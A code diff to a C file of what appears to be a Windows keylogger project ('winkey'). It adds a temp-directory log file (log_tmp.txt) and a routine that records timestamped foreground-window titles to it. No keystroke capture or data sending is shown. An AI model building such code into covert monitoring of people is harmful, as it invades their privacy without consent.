@@ -1,5 +1,28 @@
 #include "winkey.h"
 
+void CreateLogFile(void)
+{
+    wchar_t tempPath[MAX_PATH];
+
+    GetTempPathW(MAX_PATH, tempPath);
+    wcscat_s(tempPath, MAX_PATH, L"log_tmp.txt");
+    // DBG("PATH TMP: %ls", tempPath);
+
+    LOG_FD = CreateFileW(
+                            tempPath,
+                            GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
+    );
+
+    if (LOG_FD == INVALID_HANDLE_VALUE)
+    {
+        printf("CreateFile error: %lu\n", GetLastError());
+        return;
+    }
+    
+    SetFilePointer(LOG_FD, 0, NULL, FILE_END);
+}
+
 char    *GetMyLocalTime(void)
 {
     time_t      t = 0;
@@ -26,39 +49,45 @@ char    *GetMyLocalTime(void)
     return (buffer);
 }
 
-char    *GetActiveWindowTitle(void)
+void WriteToFile(char* str)
 {
-    HWND    hwnd = NULL;
-    int     size = 0;
-    char    *title = NULL;
-
-
-    hwnd = GetForegroundWindow();
-    if (!hwnd)
-    {
-        printf("No active window\n");
-        return (NULL);
-    }
-
-    size = GetWindowTextLengthA(hwnd) + 1;
-    title = malloc(size);
-    if (!title)
-        return (NULL);
-
-    GetWindowTextA(hwnd, title, size);
-
-    return (title);
+    DWORD bytesWritten;
+    WriteFile(LOG_FD, str, strlen(str), &bytesWritten, NULL);
 }
 
-char    *FormatLogTime(void)
+void _GetForegroundWindow(HWND hwnd)
 {
-    char    *time = GetMyLocalTime();
-    char    *windowTitle = GetActiveWindowTitle();
+	wchar_t windowTitleW[256];
+	if (!GetWindowTextW(hwnd, windowTitleW, sizeof(windowTitleW) / sizeof(wchar_t)))
+		return;
 
-    size_t  size = strlen((const char *)time) + strlen((const char *)windowTitle) + 6;
-    char    *log = malloc(size + 1);
-    
-    snprintf(log, size + 1, "%s - '%s'\n", time, windowTitle);
+	int i = 0;
+	while (windowTitleW[i] != '\0' && i < 256 - 1)
+	{
+		if (windowTitleW[i] == '\r' || windowTitleW[i] == '\n')
+			windowTitleW[i] = ' ';
+		i++;
+	}
+	windowTitleW[i] = '\0';
 
-    return (log);
+	int utf8Len = WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, NULL, 0, NULL, NULL);
+	char *windowTitleUtf8 = (char*)malloc(utf8Len);
+	if (!windowTitleUtf8)
+		return;
+
+	WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, windowTitleUtf8, utf8Len, NULL, NULL);
+
+	char *dateStr = GetMyLocalTime();
+	if (!dateStr)
+	{
+		free(windowTitleUtf8);
+		return;
+	}
+
+	char logEntry[1024];
+	snprintf(logEntry, sizeof(logEntry), "\n%s - '%s'\n", dateStr, windowTitleUtf8);
+	WriteToFile(logEntry);
+
+	free(windowTitleUtf8);
+	free(dateStr);
 }
